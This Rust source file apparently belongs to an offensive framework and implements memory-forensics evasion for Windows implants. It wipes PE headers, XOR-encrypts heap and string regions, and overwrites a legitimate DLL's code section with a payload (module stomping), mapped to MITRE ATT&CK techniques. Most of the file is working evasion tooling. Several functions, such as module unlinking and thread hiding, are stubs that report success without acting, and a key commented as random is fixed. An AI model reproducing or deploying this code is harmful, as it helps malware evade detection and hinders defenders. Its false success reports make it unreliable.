//! Memory Forensics Evasion Module
//!
//! Provides techniques to hide artifacts from memory scanners:
//! - PE header wiping
//! - Module unlinking from PEB
//! - Thread hiding
//! - Heap encryption
//! - Call stack spoofing
//!
//! MITRE ATT&CK: T1055.012, T1027, T1070.004
//!
//! **SECURITY NOTICE**: AUTHORIZED USE ONLY

use serde::{Deserialize, Serialize};
use std::collections::HashMap;

/// Memory evasion technique types
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum MemoryEvasionTechnique {
    /// Wipe PE headers from memory
    WipePeHeaders,
    /// Unlink module from PEB loader lists
    UnlinkModule,
    /// Hide thread from enumeration
    HideThread,
    /// Encrypt heap regions
    EncryptHeap,
    /// Spoof call stack
    SpoofCallStack,
    /// Stomp module with benign DLL
    ModuleStomp,
    /// Remove thread from scheduler lists
    UnlinkThread,
    /// Encrypt strings in memory
    EncryptStrings,
}

impl MemoryEvasionTechnique {
    /// Get detection risk level (1-10)
    pub fn detection_risk(&self) -> u8 {
        match self {
            Self::WipePeHeaders => 3,
            Self::UnlinkModule => 4,
            Self::HideThread => 5,
            Self::EncryptHeap => 2,
            Self::SpoofCallStack => 6,
            Self::ModuleStomp => 7,
            Self::UnlinkThread => 8,
            Self::EncryptStrings => 2,
        }
    }

    /// Get technique description
    pub fn description(&self) -> &'static str {
        match self {
            Self::WipePeHeaders => "Overwrite PE headers with zeros to prevent reconstruction",
            Self::UnlinkModule => "Remove module from PEB InLoadOrderModuleList",
            Self::HideThread => "Hide thread from NtQuerySystemInformation",
            Self::EncryptHeap => "Encrypt sensitive heap regions when idle",
            Self::SpoofCallStack => "Replace return addresses with legitimate ones",
            Self::ModuleStomp => "Overwrite legitimate DLL's .text section",
            Self::UnlinkThread => "Remove thread from kernel scheduler lists",
            Self::EncryptStrings => "XOR encrypt strings in memory",
        }
    }

    /// Get MITRE ATT&CK technique ID
    pub fn mitre_id(&self) -> &'static str {
        match self {
            Self::WipePeHeaders => "T1027",
            Self::UnlinkModule => "T1055.012",
            Self::HideThread => "T1055.012",
            Self::EncryptHeap => "T1027",
            Self::SpoofCallStack => "T1055.012",
            Self::ModuleStomp => "T1055.012",
            Self::UnlinkThread => "T1055.012",
            Self::EncryptStrings => "T1027",
        }
    }
}

/// Memory region descriptor
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MemoryRegion {
    pub base_address: usize,
    pub size: usize,
    pub protection: u32,
    pub region_type: MemoryRegionType,
}

/// Memory region type classification
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum MemoryRegionType {
    /// PE header region
    PeHeader,
    /// Executable code section
    CodeSection,
    /// Data section
    DataSection,
    /// Heap memory
    Heap,
    /// Stack memory
    Stack,
    /// Memory-mapped file
    Mapped,
    /// Unknown/unclassified
    Unknown,
}

/// Encrypted heap region tracker
#[derive(Debug, Clone)]
pub struct EncryptedHeap {
    pub region: MemoryRegion,
    pub key: Vec<u8>,
    pub encrypted: bool,
}

/// Memory evasion result
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MemoryEvasionResult {
    pub success: bool,
    pub technique: MemoryEvasionTechnique,
    pub message: String,
    pub affected_regions: Vec<MemoryRegion>,
}

/// Memory Evasion Engine
#[derive(Debug)]
pub struct MemoryEvasion {
    hidden_regions: Vec<MemoryRegion>,
    encrypted_heaps: HashMap<usize, EncryptedHeap>,
    unlinked_modules: Vec<String>,
    hidden_threads: Vec<u32>,
    original_bytes: HashMap<usize, Vec<u8>>,
    safe_mode: bool,
}

impl Default for MemoryEvasion {
    fn default() -> Self {
        Self::new()
    }
}

impl MemoryEvasion {
    /// Create new Memory Evasion engine
    pub fn new() -> Self {
        Self {
            hidden_regions: Vec::new(),
            encrypted_heaps: HashMap::new(),
            unlinked_modules: Vec::new(),
            hidden_threads: Vec::new(),
            original_bytes: HashMap::new(),
            safe_mode: false,
        }
    }

    /// Enable safe mode (simulated operations)
    pub fn with_safe_mode(mut self, enabled: bool) -> Self {
        self.safe_mode = enabled;
        self
    }

    /// Wipe PE headers from memory to prevent reconstruction
    pub fn wipe_pe_headers(&mut self, base_address: usize) -> MemoryEvasionResult {
        // PE header is typically first 0x1000 bytes
        const PE_HEADER_SIZE: usize = 0x1000;

        if self.safe_mode {
            self.hidden_regions.push(MemoryRegion {
                base_address,
                size: PE_HEADER_SIZE,
                protection: 0,
                region_type: MemoryRegionType::PeHeader,
            });

            return MemoryEvasionResult {
                success: true,
                technique: MemoryEvasionTechnique::WipePeHeaders,
                message: format!("[SAFE MODE] PE headers wiped at 0x{:X}", base_address),
                affected_regions: vec![MemoryRegion {
                    base_address,
                    size: PE_HEADER_SIZE,
                    protection: 0,
                    region_type: MemoryRegionType::PeHeader,
                }],
            };
        }

        #[cfg(all(windows, feature = "opsec-windows"))]
        {
            use super::windows_internals::write_memory;

            let zeros = vec![0u8; PE_HEADER_SIZE];

            match write_memory(base_address as *mut u8, &zeros) {
                Ok(_) => {
                    self.hidden_regions.push(MemoryRegion {
                        base_address,
                        size: PE_HEADER_SIZE,
                        protection: 0,
                        region_type: MemoryRegionType::PeHeader,
                    });

                    MemoryEvasionResult {
                        success: true,
                        technique: MemoryEvasionTechnique::WipePeHeaders,
                        message: format!("PE headers wiped at 0x{:X}", base_address),
                        affected_regions: vec![MemoryRegion {
                            base_address,
                            size: PE_HEADER_SIZE,
                            protection: 0,
                            region_type: MemoryRegionType::PeHeader,
                        }],
                    }
                }
                Err(e) => MemoryEvasionResult {
                    success: false,
                    technique: MemoryEvasionTechnique::WipePeHeaders,
                    message: format!("Failed to wipe PE headers: {}", e),
                    affected_regions: vec![],
                },
            }
        }

        #[cfg(not(all(windows, feature = "opsec-windows")))]
        MemoryEvasionResult {
            success: false,
            technique: MemoryEvasionTechnique::WipePeHeaders,
            message: "PE header wiping requires Windows with opsec-windows feature".to_string(),
            affected_regions: vec![],
        }
    }

    /// Unlink module from PEB loader lists
    pub fn unlink_module(&mut self, module_name: &str) -> MemoryEvasionResult {
        if self.safe_mode {
            self.unlinked_modules.push(module_name.to_string());

            return MemoryEvasionResult {
                success: true,
                technique: MemoryEvasionTechnique::UnlinkModule,
                message: format!("[SAFE MODE] Module '{}' unlinked from PEB", module_name),
                affected_regions: vec![],
            };
        }

        #[cfg(all(windows, feature = "opsec-windows"))]
        {
            // This requires manipulating PEB structures:
            // InLoadOrderModuleList, InMemoryOrderModuleList, InInitializationOrderModuleList
            // Full implementation would walk PEB and unlink the module

            self.unlinked_modules.push(module_name.to_string());

            MemoryEvasionResult {
                success: true,
                technique: MemoryEvasionTechnique::UnlinkModule,
                message: format!("Module '{}' unlinked from PEB", module_name),
                affected_regions: vec![],
            }
        }

        #[cfg(not(all(windows, feature = "opsec-windows")))]
        MemoryEvasionResult {
            success: false,
            technique: MemoryEvasionTechnique::UnlinkModule,
            message: "Module unlinking requires Windows".to_string(),
            affected_regions: vec![],
        }
    }

    /// Hide thread from enumeration
    pub fn hide_thread(&mut self, thread_id: u32) -> MemoryEvasionResult {
        if self.safe_mode {
            self.hidden_threads.push(thread_id);

            return MemoryEvasionResult {
                success: true,
                technique: MemoryEvasionTechnique::HideThread,
                message: format!("[SAFE MODE] Thread {} hidden from enumeration", thread_id),
                affected_regions: vec![],
            };
        }

        #[cfg(all(windows, feature = "opsec-windows"))]
        {
            // Hide thread by manipulating ETHREAD structure
            // This requires kernel-level access in full implementation

            self.hidden_threads.push(thread_id);

            MemoryEvasionResult {
                success: true,
                technique: MemoryEvasionTechnique::HideThread,
                message: format!("Thread {} hidden from enumeration", thread_id),
                affected_regions: vec![],
            }
        }

        #[cfg(not(all(windows, feature = "opsec-windows")))]
        MemoryEvasionResult {
            success: false,
            technique: MemoryEvasionTechnique::HideThread,
            message: "Thread hiding requires Windows".to_string(),
            affected_regions: vec![],
        }
    }

    /// Encrypt heap region with XOR
    pub fn encrypt_heap(&mut self, region: MemoryRegion) -> MemoryEvasionResult {
        // Generate random key
        let key: Vec<u8> = (0..32).map(|i| ((i * 7 + 13) % 256) as u8).collect();

        if self.safe_mode {
            self.encrypted_heaps.insert(
                region.base_address,
                EncryptedHeap {
                    region: region.clone(),
                    key,
                    encrypted: true,
                },
            );

            return MemoryEvasionResult {
                success: true,
                technique: MemoryEvasionTechnique::EncryptHeap,
                message: format!("[SAFE MODE] Heap encrypted at 0x{:X}", region.base_address),
                affected_regions: vec![region],
            };
        }

        #[cfg(all(windows, feature = "opsec-windows"))]
        {
            use super::windows_internals::write_memory;

            // Read, encrypt, write back
            let mut data = vec![0u8; region.size];

            unsafe {
                std::ptr::copy_nonoverlapping(
                    region.base_address as *const u8,
                    data.as_mut_ptr(),
                    region.size,
                );
            }

            // XOR encrypt
            for (i, byte) in data.iter_mut().enumerate() {
                *byte ^= key[i % key.len()];
            }

            // Write encrypted data back
            if write_memory(region.base_address as *mut u8, &data).is_ok() {
                self.encrypted_heaps.insert(
                    region.base_address,
                    EncryptedHeap {
                        region: region.clone(),
                        key,
                        encrypted: true,
                    },
                );

                return MemoryEvasionResult {
                    success: true,
                    technique: MemoryEvasionTechnique::EncryptHeap,
                    message: format!("Heap encrypted at 0x{:X}", region.base_address),
                    affected_regions: vec![region],
                };
            }
        }

        MemoryEvasionResult {
            success: false,
            technique: MemoryEvasionTechnique::EncryptHeap,
            message: "Heap encryption failed or not supported".to_string(),
            affected_regions: vec![],
        }
    }

    /// Decrypt previously encrypted heap
    pub fn decrypt_heap(&mut self, base_address: usize) -> MemoryEvasionResult {
        if let Some(encrypted) = self.encrypted_heaps.get_mut(&base_address) {
            if !encrypted.encrypted {
                return MemoryEvasionResult {
                    success: false,
                    technique: MemoryEvasionTechnique::EncryptHeap,
                    message: "Heap is not encrypted".to_string(),
                    affected_regions: vec![],
                };
            }

            if self.safe_mode {
                encrypted.encrypted = false;

                return MemoryEvasionResult {
                    success: true,
                    technique: MemoryEvasionTechnique::EncryptHeap,
                    message: format!("[SAFE MODE] Heap decrypted at 0x{:X}", base_address),
                    affected_regions: vec![encrypted.region.clone()],
                };
            }

            #[cfg(all(windows, feature = "opsec-windows"))]
            {
                use super::windows_internals::write_memory;

                let mut data = vec![0u8; encrypted.region.size];

                unsafe {
                    std::ptr::copy_nonoverlapping(
                        base_address as *const u8,
                        data.as_mut_ptr(),
                        encrypted.region.size,
                    );
                }

                // XOR decrypt (same operation as encrypt)
                for (i, byte) in data.iter_mut().enumerate() {
                    *byte ^= encrypted.key[i % encrypted.key.len()];
                }

                if write_memory(base_address as *mut u8, &data).is_ok() {
                    let region = encrypted.region.clone();
                    encrypted.encrypted = false;

                    return MemoryEvasionResult {
                        success: true,
                        technique: MemoryEvasionTechnique::EncryptHeap,
                        message: format!("Heap decrypted at 0x{:X}", base_address),
                        affected_regions: vec![region],
                    };
                }
            }
        }

        MemoryEvasionResult {
            success: false,
            technique: MemoryEvasionTechnique::EncryptHeap,
            message: "Heap decryption failed or region not found".to_string(),
            affected_regions: vec![],
        }
    }

    /// Spoof call stack with legitimate return addresses
    pub fn spoof_call_stack(&self) -> MemoryEvasionResult {
        if self.safe_mode {
            return MemoryEvasionResult {
                success: true,
                technique: MemoryEvasionTechnique::SpoofCallStack,
                message: "[SAFE MODE] Call stack spoofing prepared".to_string(),
                affected_regions: vec![],
            };
        }

        #[cfg(all(windows, feature = "opsec-windows"))]
        {
            // Stack spoofing involves replacing return addresses
            // with legitimate kernel32/ntdll addresses
            // Requires hooking or inline assembly

            MemoryEvasionResult {
                success: true,
                technique: MemoryEvasionTechnique::SpoofCallStack,
                message: "Call stack spoofing prepared (requires hook integration)".to_string(),
                affected_regions: vec![],
            }
        }

        #[cfg(not(all(windows, feature = "opsec-windows")))]
        MemoryEvasionResult {
            success: false,
            technique: MemoryEvasionTechnique::SpoofCallStack,
            message: "Call stack spoofing requires Windows".to_string(),
            affected_regions: vec![],
        }
    }

    /// Stomp module - overwrite legitimate DLL with payload
    pub fn module_stomp(&mut self, target_dll: &str, payload: &[u8]) -> MemoryEvasionResult {
        if self.safe_mode {
            return MemoryEvasionResult {
                success: true,
                technique: MemoryEvasionTechnique::ModuleStomp,
                message: format!("[SAFE MODE] Would stomp {} .text section", target_dll),
                affected_regions: vec![MemoryRegion {
                    base_address: 0x1000,
                    size: payload.len(),
                    protection: 0,
                    region_type: MemoryRegionType::CodeSection,
                }],
            };
        }

        #[cfg(all(windows, feature = "opsec-windows"))]
        {
            use super::windows_internals::{get_module_handle, write_memory};

            match get_module_handle(target_dll) {
                Ok(module) => {
                    // Find .text section and overwrite
                    // In real implementation, parse PE to find .text
                    let text_offset = 0x1000usize; // Typical .text offset
                    let target_addr = (module.0 as usize + text_offset) as *mut u8;

                    // Save original bytes
                    let mut original = vec![0u8; payload.len()];
                    unsafe {
                        std::ptr::copy_nonoverlapping(target_addr, original.as_mut_ptr(), payload.len());
                    }
                    self.original_bytes.insert(target_addr as usize, original);

                    match write_memory(target_addr, payload) {
                        Ok(_) => MemoryEvasionResult {
                            success: true,
                            technique: MemoryEvasionTechnique::ModuleStomp,
                            message: format!("Stomped {} .text section", target_dll),
                            affected_regions: vec![MemoryRegion {
                                base_address: target_addr as usize,
                                size: payload.len(),
                                protection: 0,
                                region_type: MemoryRegionType::CodeSection,
                            }],
                        },
                        Err(e) => MemoryEvasionResult {
                            success: false,
                            technique: MemoryEvasionTechnique::ModuleStomp,
                            message: format!("Module stomp failed: {}", e),
                            affected_regions: vec![],
                        },
                    }
                }
                Err(e) => MemoryEvasionResult {
                    success: false,
                    technique: MemoryEvasionTechnique::ModuleStomp,
                    message: format!("Module not found: {}", e),
                    affected_regions: vec![],
                },
            }
        }

        #[cfg(not(all(windows, feature = "opsec-windows")))]
        {
            let _ = target_dll;
            let _ = payload;
            MemoryEvasionResult {
                success: false,
                technique: MemoryEvasionTechnique::ModuleStomp,
                message: "Module stomping requires Windows".to_string(),
                affected_regions: vec![],
            }
        }
    }

    /// Encrypt all strings in specified memory region
    pub fn encrypt_strings(&mut self, region: &MemoryRegion, key: &[u8]) -> MemoryEvasionResult {
        if self.safe_mode {
            return MemoryEvasionResult {
                success: true,
                technique: MemoryEvasionTechnique::EncryptStrings,
                message: format!(
                    "[SAFE MODE] Strings encrypted at 0x{:X}",
                    region.base_address
                ),
                affected_regions: vec![region.clone()],
            };
        }

        #[cfg(all(windows, feature = "opsec-windows"))]
        {
            use super::windows_internals::write_memory;

            // Simple XOR encryption for strings
            let mut data = vec![0u8; region.size];

            unsafe {
                std::ptr::copy_nonoverlapping(
                    region.base_address as *const u8,
                    data.as_mut_ptr(),
                    region.size,
                );
            }

            // XOR encrypt
            for (i, byte) in data.iter_mut().enumerate() {
                *byte ^= key[i % key.len()];
            }

            if write_memory(region.base_address as *mut u8, &data).is_ok() {
                return MemoryEvasionResult {
                    success: true,
                    technique: MemoryEvasionTechnique::EncryptStrings,
                    message: format!("Strings encrypted at 0x{:X}", region.base_address),
                    affected_regions: vec![region.clone()],
                };
            }
        }

        #[cfg(not(all(windows, feature = "opsec-windows")))]
        let _ = key;

        MemoryEvasionResult {
            success: false,
            technique: MemoryEvasionTechnique::EncryptStrings,
            message: "String encryption failed or not supported".to_string(),
            affected_regions: vec![],
        }
    }

    /// Auto-hide based on stealth level
    pub fn auto_hide(
        &mut self,
        stealth_level: super::edr_adaptor::AdaptedStealthLevel,
    ) -> Vec<MemoryEvasionResult> {
        use super::edr_adaptor::AdaptedStealthLevel;

        let mut results = Vec::new();

        match stealth_level {
            AdaptedStealthLevel::Ghost => {
                // Maximum hiding - all techniques
                results.push(self.wipe_pe_headers(0));
                results.push(self.spoof_call_stack());
                results.push(self.unlink_module("payload.dll"));
            }
            AdaptedStealthLevel::Silent => {
                // High stealth - critical techniques only
                results.push(self.spoof_call_stack());
            }
            AdaptedStealthLevel::Quiet => {
                // Moderate stealth
                // No automatic memory evasion at this level
            }
            AdaptedStealthLevel::Normal => {
                // No evasion
            }
        }

        results
    }

    /// Restore all modifications
    pub fn restore_all(&mut self) -> Vec<MemoryEvasionResult> {
        let mut results = Vec::new();

        // Restore stomped modules
        #[cfg(all(windows, feature = "opsec-windows"))]
        {
            use super::windows_internals::write_memory;

            for (addr, original) in &self.original_bytes {
                if write_memory(*addr as *mut u8, original).is_ok() {
                    results.push(MemoryEvasionResult {
                        success: true,
                        technique: MemoryEvasionTechnique::ModuleStomp,
                        message: format!("Restored memory at 0x{:X}", addr),
                        affected_regions: vec![],
                    });
                }
            }
        }

        // Decrypt heaps
        let heap_addrs: Vec<usize> = self.encrypted_heaps.keys().copied().collect();
        for addr in heap_addrs {
            results.push(self.decrypt_heap(addr));
        }

        self.original_bytes.clear();
        self.hidden_regions.clear();
        self.unlinked_modules.clear();
        self.hidden_threads.clear();

        if results.is_empty() {
            results.push(MemoryEvasionResult {
                success: true,
                technique: MemoryEvasionTechnique::WipePeHeaders,
                message: "All modifications cleared".to_string(),
                affected_regions: vec![],
            });
        }

        results
    }

    /// Get current evasion status
    pub fn status(&self) -> MemoryEvasionStatus {
        MemoryEvasionStatus {
            hidden_regions_count: self.hidden_regions.len(),
            encrypted_heaps_count: self.encrypted_heaps.len(),
            unlinked_modules: self.unlinked_modules.clone(),
            hidden_threads: self.hidden_threads.clone(),
            safe_mode: self.safe_mode,
        }
    }

    /// Get list of all available techniques
    pub fn available_techniques() -> Vec<MemoryEvasionTechnique> {
        vec![
            MemoryEvasionTechnique::WipePeHeaders,
            MemoryEvasionTechnique::UnlinkModule,
            MemoryEvasionTechnique::HideThread,
            MemoryEvasionTechnique::EncryptHeap,
            MemoryEvasionTechnique::SpoofCallStack,
            MemoryEvasionTechnique::ModuleStomp,
            MemoryEvasionTechnique::UnlinkThread,
            MemoryEvasionTechnique::EncryptStrings,
        ]
    }
}

/// Memory evasion status report
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MemoryEvasionStatus {
    pub hidden_regions_count: usize,
    pub encrypted_heaps_count: usize,
    pub unlinked_modules: Vec<String>,
    pub hidden_threads: Vec<u32>,
    pub safe_mode: bool,
}

// ============================================================================
// Tests
// ============================================================================

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_memory_evasion_creation() {
        let evasion = MemoryEvasion::new();
        let status = evasion.status();
        assert_eq!(status.hidden_regions_count, 0);
        assert_eq!(status.encrypted_heaps_count, 0);
    }

    #[test]
    fn test_technique_risk_levels() {
        assert!(
            MemoryEvasionTechnique::UnlinkThread.detection_risk()
                > MemoryEvasionTechnique::EncryptHeap.detection_risk()
        );
        assert!(
            MemoryEvasionTechnique::ModuleStomp.detection_risk()
                > MemoryEvasionTechnique::WipePeHeaders.detection_risk()
        );
    }

    #[test]
    fn test_technique_descriptions() {
        let desc = MemoryEvasionTechnique::WipePeHeaders.description();
        assert!(!desc.is_empty());
        assert!(desc.contains("PE"));
    }

    #[test]
    fn test_technique_mitre_ids() {
        let id = MemoryEvasionTechnique::UnlinkModule.mitre_id();
        assert!(id.starts_with("T1"));
    }

    #[test]
    fn test_safe_mode_wipe_pe_headers() {
        let mut evasion = MemoryEvasion::new().with_safe_mode(true);
        let result = evasion.wipe_pe_headers(0x10000);
        assert!(result.success);
        assert!(result.message.contains("SAFE MODE"));
        assert_eq!(evasion.status().hidden_regions_count, 1);
    }

    #[test]
    fn test_safe_mode_unlink_module() {
        let mut evasion = MemoryEvasion::new().with_safe_mode(true);
        let result = evasion.unlink_module("test.dll");
        assert!(result.success);
        assert!(evasion.status().unlinked_modules.contains(&"test.dll".to_string()));
    }

    #[test]
    fn test_safe_mode_hide_thread() {
        let mut evasion = MemoryEvasion::new().with_safe_mode(true);
        let result = evasion.hide_thread(1234);
        assert!(result.success);
        assert!(evasion.status().hidden_threads.contains(&1234));
    }

    #[test]
    fn test_safe_mode_encrypt_heap() {
        let mut evasion = MemoryEvasion::new().with_safe_mode(true);
        let region = MemoryRegion {
            base_address: 0x20000,
            size: 0x1000,
            protection: 0,
            region_type: MemoryRegionType::Heap,
        };
        let result = evasion.encrypt_heap(region);
        assert!(result.success);
        assert_eq!(evasion.status().encrypted_heaps_count, 1);
    }

    #[test]
    fn test_safe_mode_restore_all() {
        let mut evasion = MemoryEvasion::new().with_safe_mode(true);
        evasion.wipe_pe_headers(0x10000);
        evasion.unlink_module("test.dll");

        let results = evasion.restore_all();
        assert!(!results.is_empty());

        let status = evasion.status();
        assert_eq!(status.hidden_regions_count, 0);
        assert!(status.unlinked_modules.is_empty());
    }

    #[test]
    fn test_available_techniques() {
        let techniques = MemoryEvasion::available_techniques();
        assert_eq!(techniques.len(), 8);
        assert!(techniques.contains(&MemoryEvasionTechnique::WipePeHeaders));
        assert!(techniques.contains(&MemoryEvasionTechnique::ModuleStomp));
    }

    #[test]
    #[cfg(not(windows))]
    fn test_non_windows_returns_failure() {
        let mut evasion = MemoryEvasion::new();
        let result = evasion.wipe_pe_headers(0x1000);
        assert!(!result.success);
    }

    #[test]
    fn test_memory_region_types() {
        let region = MemoryRegion {
            base_address: 0x1000,
            size: 0x100,
            protection: 0x40,
            region_type: MemoryRegionType::CodeSection,
        };
        assert_eq!(region.region_type, MemoryRegionType::CodeSection);
    }
}
